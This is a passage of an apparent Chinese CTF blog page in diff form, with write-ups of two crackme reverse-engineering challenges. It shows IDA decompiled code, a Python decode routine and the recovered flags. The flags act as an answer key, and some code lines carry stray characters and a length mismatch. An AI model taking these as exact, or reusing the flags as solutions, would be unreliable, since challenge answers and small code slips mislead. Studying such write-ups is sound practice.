class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>第一个函数很简单，就是将数据进行了处理，我们可以在函数名处按n键对函数进行重命名，方便我们之后的观看，这里我们就命名为encode，而数据我们直接dump出来，也就是</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list = [<span class="number">0x68</span>, <span class="number">0x23</span>, <span class="number">0x51</span>, <span class="number">0x8D</span>, <span class="number">0xC8</span>, <span class="number">0xC9</span>, <span class="number">0x1F</span>, <span class="number">0x93</span>, <span class="number">0xF3</span>, <span class="number">0xFA</span>, <span class="number">0xFF</span>, <span class="number">0x9E</span>, <span class="number">0x37</span>, <span class="number">0x77</span>, <span class="number">0x1B</span>, <span class="number">0x83</span>, <span class="number">0x81</span>, <span class="number">0x69</span>, <span class="number">0x6D</span>, <span class="number">0x46</span>, <span class="number">0x64</span>, <span class="number">0xCF</span>, <span class="number">0x4B</span>, <span class="number">0xAD</span>, <span class="number">0x6A</span>, <span class="number">0xA8</span>, <span class="number">0xAA</span>, <span class="number">0xEA</span>, <span class="number">0x41</span>, <span class="number">0x45</span>, <span class="number">0x7B</span>h, <span class="number">0xAB</span>]</span><br></pre></td></tr></table></figure>
+<p>第二个函数稍显复杂，首先是对我们输入的数据进行encode，然后返回值在encode，然后返回值再encode。然后是一段循环处理，可以看到v4作为数组的下标是在不断++的，而一旦encode后的数据和我们输入的某一位不一样，那就直接return了，v3则是作为计数器，他的初始值等于我们的数据长度，而在每次都会-4，最后如果减到了&lt;4的情况，就会弹出一个MessageBox</p>
+<p>接下来的任务就是分析encode了，ida跳过去（这里我已经把一些关键变量改好名字了）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__usercall sub_401080@&lt;eax&gt;(_BYTE *a1@&lt;edi&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> count; <span class="comment">// esi</span></span><br><span class="line">  _BYTE *<span class="built_in">array</span>; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// cl</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// cl</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// dl</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// cl</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// dl</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// cl</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// dl</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">1</span> - a1;</span><br><span class="line">  count = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">array</span> = a1;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = __ROL1__(*<span class="built_in">array</span>, <span class="number">3</span>);      <span class="comment">//ROL是移位（就是c语言的位操作）的意思</span></span><br><span class="line">    *<span class="built_in">array</span> = v4;        			</span><br><span class="line">    <span class="keyword">if</span> ( count &gt;= <span class="number">1</span> ) </span><br><span class="line">      *<span class="built_in">array</span> = v4 ^ a1[count - <span class="number">1</span>];</span><br><span class="line">    v5 = __ROL1__(*<span class="built_in">array</span>, <span class="number">4</span>) + <span class="number">3</span>;</span><br><span class="line">    v6 = __ROL1__(<span class="built_in">array</span>[<span class="number">1</span>], <span class="number">3</span>);</span><br><span class="line">    *<span class="built_in">array</span> = v5;                     <span class="comment">//数据被四个分为了一组，这是每组的第一位</span></span><br><span class="line">    <span class="built_in">array</span>[<span class="number">1</span>] = v6;       </span><br><span class="line">    <span class="keyword">if</span> ( &amp;<span class="built_in">array</span>[v1] &gt;= <span class="number">1</span> )</span><br><span class="line">      <span class="built_in">array</span>[<span class="number">1</span>] = v6 ^ v5;</span><br><span class="line">    v7 = __ROL1__(<span class="built_in">array</span>[<span class="number">1</span>], <span class="number">4</span>) + <span class="number">3</span>;</span><br><span class="line">    v8 = __ROL1__(<span class="built_in">array</span>[<span class="number">2</span>], <span class="number">3</span>);</span><br><span class="line">    <span class="built_in">array</span>[<span class="number">1</span>] = v7;					<span class="comment">//每组数据的第二位</span></span><br><span class="line">    <span class="built_in">array</span>[<span class="number">2</span>] = v8;</span><br><span class="line">    <span class="keyword">if</span> ( &amp;<span class="built_in">array</span>[<span class="number">2</span> - a1] &gt;= <span class="number">1</span> )</span><br><span class="line">      <span class="built_in">array</span>[<span class="number">2</span>] = v8 ^ v7;</span><br><span class="line">    v9 = __ROL1__(<span class="built_in">array</span>[<span class="number">2</span>], <span class="number">4</span>) + <span class="number">3</span>;</span><br><span class="line">    v10 = __ROL1__(<span class="built_in">array</span>[<span class="number">3</span>], <span class="number">3</span>);</span><br><span class="line">    <span class="built_in">array</span>[<span class="number">2</span>] = v9;               <span class="comment">//第三位</span></span><br><span class="line">    <span class="built_in">array</span>[<span class="number">3</span>] = v10;</span><br><span class="line">    <span class="keyword">if</span> ( &amp;<span class="built_in">array</span>[<span class="number">3</span> - a1] &gt;= <span class="number">1</span> )</span><br><span class="line">      <span class="built_in">array</span>[<span class="number">3</span>] = v10 ^ v9;        </span><br><span class="line">    <span class="built_in">array</span>[<span class="number">3</span>] = __ROL1__(<span class="built_in">array</span>[<span class="number">3</span>], <span class="number">4</span>) + <span class="number">3</span>;    <span class="comment">//第四位</span></span><br><span class="line">    count += <span class="number">4</span>;       <span class="comment">//起到了计数器的作用  </span></span><br><span class="line">    <span class="built_in">array</span> += <span class="number">4</span>;       <span class="comment">//注意这里不是真的地址+4，而是由第1个数据变为第1+4个数据，可以替换为数组下标</span></span><br><span class="line">    <span class="keyword">if</span> ( count &gt;= <span class="number">32</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v1 = <span class="number">1</span> - a1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a1 + <span class="number">1</span>;     <span class="comment">//注意这里返回的是a1加1，也就是传入数据的下一位</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到该函数将传入的数据四个分为一组进行处理移位，且处理有规律可言，我们对上述的函数进行简化</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> * <span class="title">encrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> * pt)</span> </span>&#123;</span><br><span class="line">    pt[<span class="number">0</span>] = rol(pt[<span class="number">0</span>], <span class="number">7</span>) + <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        pt[i] = rol(pt[i], <span class="number">3</span>) ^ pt[i<span class="number">-1</span>];</span><br><span class="line">        pt[i] = rol(pt[i], <span class="number">4</span>) + <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pt+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>由于移位操作和减法都是简单可逆（减的加上，左移的右移回去）的，所以我们很轻松就可以写出解密函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(list, fuck)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">31</span>-fuck+<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>):</span><br><span class="line">        list[i + fuck] = ror(list[i + fuck]<span class="number">-3</span>,<span class="number">4</span>) &amp; <span class="number">0xff</span></span><br><span class="line">        list[i + fuck] = ror((list[i + fuck] &amp; <span class="number">0xff</span>) ^ (list[i + fuck - <span class="number">1</span>] &amp; <span class="number">0xff</span>),<span class="number">3</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    list[fuck] = ror(list[fuck]<span class="number">-3</span>,<span class="number">7</span>) &amp; <span class="number">0xff</span></span><br></pre></td></tr></table></figure>
+<p>这里要注意一个细节问题，在ida中我们可以清楚的看到我们传入的数据是unsigned char（也就是一个字节）类型的，而我们在使用python去进行解密的时候由于用的是int的list，所以会产生数据大小不对称的问题，我们这里用&amp;0xff的方式来限制我们的数据大小。</p>
+<p>最后的脚本要注意，程序先将数据encode，接着将输入encode，输入的返回值encode，返回值再encode，所以我们在逆向解密时，应该先将数据encode，再将数据decode，再将数据从1的位置decode，再将数据从2的位置decode</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">encode(list)</span><br><span class="line">decode(list,<span class="number">2</span>)</span><br><span class="line">decode(list,<span class="number">1</span>)</span><br><span class="line">decode(list,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+<p>具体的脚本就不放了，最终解得的flag是</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fyj21bw1pkj30e401kt8n.jpg" alt="image-20181225160804820"></p>
+<p>这道题目就到这里了，难度不是很高，主要还是要耐心去逆向算法，</p>
+<h1 id="Open-Windows"><a href="#Open-Windows" class="headerlink" title="Open Windows"></a>Open Windows</h1><p>还是按照上面的方法找到DialogFunc的位置，这里要提到一些新知识了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">BOOL __<span class="function">stdcall <span class="title">DialogFunc</span><span class="params">(HWND a1, UINT vm_command, WPARAM a3, LPARAM a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  WPARAM v4; <span class="comment">// ebx</span></span><br><span class="line">  HWND v6; <span class="comment">// esi</span></span><br><span class="line">  HWND v7; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">const</span> CHAR *v8; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( vm_command &gt; <span class="number">0x110</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( vm_command == <span class="number">274</span> &amp;&amp; a3 == <span class="number">61536</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      HIBYTE(a3) = <span class="number">0</span>;</span><br><span class="line">      sub_4012E0((_BYTE *)&amp;a3 + <span class="number">3</span>);</span><br><span class="line">      v8 = Src;</span><br><span class="line">      <span class="keyword">if</span> ( dword_403848 - (_DWORD)Src == <span class="number">11</span> &amp;&amp; x == <span class="number">771</span> &amp;&amp; y == <span class="number">0x63A421C737F6FFE0</span>i64 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( sub_401040(Src) )</span><br><span class="line">          MessageBoxA(<span class="number">0</span>, v8, <span class="string">"success"</span>, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      EndDialog(a1, <span class="number">61536</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( vm_command )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x110</span>u:                              <span class="comment">// 初始化</span></span><br><span class="line">        v7 = a1;</span><br><span class="line">        y = <span class="number">1</span>i64;</span><br><span class="line">        x = <span class="number">0</span>i64;</span><br><span class="line">        dword_4037CC = GetWindowLongA(a1, <span class="number">-6</span>);</span><br><span class="line">        h = LoadBitmapA((HINSTANCE)dword_4037CC, (LPCSTR)<span class="number">0x68</span>);</span><br><span class="line">        GetObjectA(h, <span class="number">24</span>, &amp;unk_403820);</span><br><span class="line">        SetWindowPos(v7, HWND_MESSAGE|<span class="number">0x2</span>, <span class="number">0</span>, <span class="number">0</span>, dword_403824, cy, <span class="number">6u</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xF</span>u:                                <span class="comment">// 画图</span></span><br><span class="line">        v6 = a1;</span><br><span class="line">        hdc = BeginPaint(a1, &amp;Paint);</span><br><span class="line">        hdcSrc = CreateCompatibleDC(hdc);</span><br><span class="line">        SelectObject(hdcSrc, h);</span><br><span class="line">        BitBlt(hdc, <span class="number">0</span>, <span class="number">0</span>, dword_403824, cy, hdcSrc, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0xCC0020</span>u);</span><br><span class="line">        DeleteDC(hdcSrc);</span><br><span class="line">        EndPaint(v6, &amp;Paint);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x101</span>u:                              <span class="comment">// 实际操作的keyup</span></span><br><span class="line">        v4 = a3;</span><br><span class="line">        HIBYTE(a1) = a3;</span><br><span class="line">        sub_4012E0((_BYTE *)&amp;a1 + <span class="number">3</span>);</span><br><span class="line">        y *= v4;</span><br><span class="line">        x += v4;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到进入函数后会对vm_command（我这里进行了重命名，ida原本应该是a2）进行比较，对不同的vm_command进行不同的操作。这其实就是windows的消息机制，vvm_command就是个消息，而我们的DialogFunc会对不同消息进行不同的响应，举个例子，你的鼠标点击、键盘敲击等等都属于一种消息，当我们点击“关闭”按钮的时候，就发送了一个关闭窗口的消息，他有一个对应的值，这时windows检测到了这个消息发生了，就会进行关闭窗口的操作并且执行用户写在此处的相关代码</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fyjxye5gcyj317k0hqdhf.jpg" alt="image-20181226103224409"></p>
+<p>当我们分析这个程序时，首先从vm_command来将程序划为不同的区域，如：case 0x110处就是用来初始化的函数，而0xF则涉及到图形绘制的一些功能，很显然这都不是我们要关心的，而case 0x101我们则要特别注意，因为0x101代表的事件是用户在使用键盘按键（准确的说是按键“弹起来”）了。</p>
+<p>在这里可以看到函数调用了两个函数，然后将我们的键盘对应的按键的值加给了x，乘给了y，也就是说x是累加器，y是累乘器。HIBYTE是从给定的16位中提取其中的高位部分，因为我们键盘上的按键是拿ASCII来标示的，所以其实只占用了一个字节，也就是8位，所以也就是让a1的高位部分等于键盘输入的按键值</p>
+<p>接着进入第二个函数来分析</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__usercall sub_4012E0@&lt;eax&gt;(_BYTE *a1@&lt;eax&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *v1; <span class="comment">// esi</span></span><br><span class="line">  _BYTE *v2; <span class="comment">// eax</span></span><br><span class="line">  LPCSTR v3; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// esi</span></span><br><span class="line">  _BYTE *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v1 = a1;</span><br><span class="line">  v2 = konw_what;</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= konw_what || (v3 = Src, Src &gt; v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( konw_what == dword_40384C )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_401350();</span><br><span class="line">      v2 = konw_what;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      *v2 = *v1;</span><br><span class="line">      v2 = konw_what;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4 = v1 - Src;</span><br><span class="line">    <span class="keyword">if</span> ( konw_what == dword_40384C )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_401350();</span><br><span class="line">      v2 = konw_what;</span><br><span class="line">      v3 = Src;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      *v2 = v3[v4];</span><br><span class="line">      <span class="keyword">return</span> (konw_what++ + <span class="number">1</span>);c</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  result = v2 + <span class="number">1</span>;</span><br><span class="line">  konw_what = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到这个函数稍显复杂，我们当然可以一步一步慢慢分析，但我们可以从第15行的函数中发现一些线索，我们点进去</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_401350</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  LPCSTR v0; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v0 = Src;</span><br><span class="line">  v1 = konw_what - Src;</span><br><span class="line">  <span class="keyword">if</span> ( (konw_what - Src) &gt; <span class="number">0xFFFFFFFE</span> )</span><br><span class="line">    <span class="built_in">std</span>::_Xlength_error(<span class="string">"vector&lt;T&gt; too long"</span>);</span><br><span class="line">  result = v1 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( result &gt; dword_40384C - v0 )</span><br><span class="line">    result = sub_4013A0();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>很显然这里实现了类似异常检测的功能，当我们的know_what（命名鬼才）-src的值过大的时候就会产生too long的错误，我们就可以推测，know_what - src的值就应该是用户输入的长度。</p>
+<p>最后一部分是关闭窗口的代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( konw_what - Src == <span class="number">11</span> &amp;&amp; x == <span class="number">771</span> &amp;&amp; y == <span class="number">0x63A421C737F6FFE0</span>i64 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( sub_401040(Src) )</span><br><span class="line">    MessageBoxA(<span class="number">0</span>, v8, <span class="string">"success"</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到他要求我们输入10个字符，和为771，乘积为0x63A421C737F6FFE0，，接着还会调用一个函数，在点进去看看</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __usercall sub_401040@&lt;eax&gt;(<span class="keyword">const</span> <span class="keyword">char</span> *input@&lt;ebx&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">char</span> data; <span class="comment">// al</span></span><br><span class="line">  _DWORD *judge_table; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> count; <span class="comment">// eax</span></span><br><span class="line">  _DWORD *v7; <span class="comment">// [esp+0h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(input) == <span class="number">10</span> )      <span class="comment">//检测输入长度是否为10</span></span><br><span class="line">  &#123;  </span><br><span class="line">    i = <span class="number">0</span>;                       <span class="comment">//循环变量我用i、j、count进行了标示</span></span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> ) </span><br><span class="line">    &#123;</span><br><span class="line">      data = input[i];</span><br><span class="line">      <span class="keyword">if</span> ( data &gt; <span class="number">90</span> || data &lt; <span class="number">65</span> )             <span class="comment">// 循环每一个值检测是否为大写字母</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( ++i &gt;= <span class="number">10</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        judge_table = &amp;table;      </span><br><span class="line">        j = <span class="number">0</span>;</span><br><span class="line">        v7 = &amp;table;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          count = j;</span><br><span class="line">          <span class="keyword">if</span> ( j &lt; <span class="number">10</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">LABEL_12:</span><br><span class="line">          judge_table += <span class="number">0x11</span>;         <span class="comment">//judge_table每0x11个是一组</span></span><br><span class="line">          ++j;</span><br><span class="line">          v7 = judge_table;            </span><br><span class="line">          <span class="keyword">if</span> ( judge_table &gt;= &amp;border )    <span class="comment">//检查judge_table是否到头了</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( input[j] &gt; input[count] == *judge_table )   <span class="comment">//检测input的每个值和所有的值比较的结果是不是符合judge_table的结果</span></span><br><span class="line">        &#123;</span><br><span class="line">          ++count;</span><br><span class="line">          ++judge_table;</span><br><span class="line">          <span class="keyword">if</span> ( count &gt;= <span class="number">10</span> )         </span><br><span class="line">          &#123;</span><br><span class="line">            judge_table = v7;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_12;         <span class="comment">//这里实现了嵌套循环的功能</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>逻辑也不难，首先检测每个值是不是都是大写字母，然后就是依次拿出input的每个值，把值和另外的其他的值进行比较，且比较的结果要符合judge_table的里保存的真值。而由于judge_table是16个一循环的，我们可以把它当作一个矩阵结构，然后使用它的前十行前十列即可。</p>
+<p>到这里我们就有了如下的信息</p>
+<ul>
+<li>flag长度为10</li>
+<li>flag的每个值和另外的值比较的结果满足judge_table</li>
+<li>所有的值都是大写字母</li>
+<li>和为771，乘积为0x63A421C737F6FFE0</li>
+</ul>
+<p>我们可以通过分解乘积，将分解出的值固定在大写字母范围以内的方式来确定输入的字母，然后提取出来judge_table来搞定字母的顺序</p>
+<p>最终flag为<strong>LKSOQWEDSF</strong></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/22/数据结构基础-二叉树/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Asa9ao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Asa9ao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/22/数据结构基础-二叉树/" itemprop="url">数据结构基础--二叉树</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-22T21:53:18+08:00">
+                2018-12-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/数据结构/" itemprop="url" rel="index">
+                    <span itemprop="name">数据结构</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
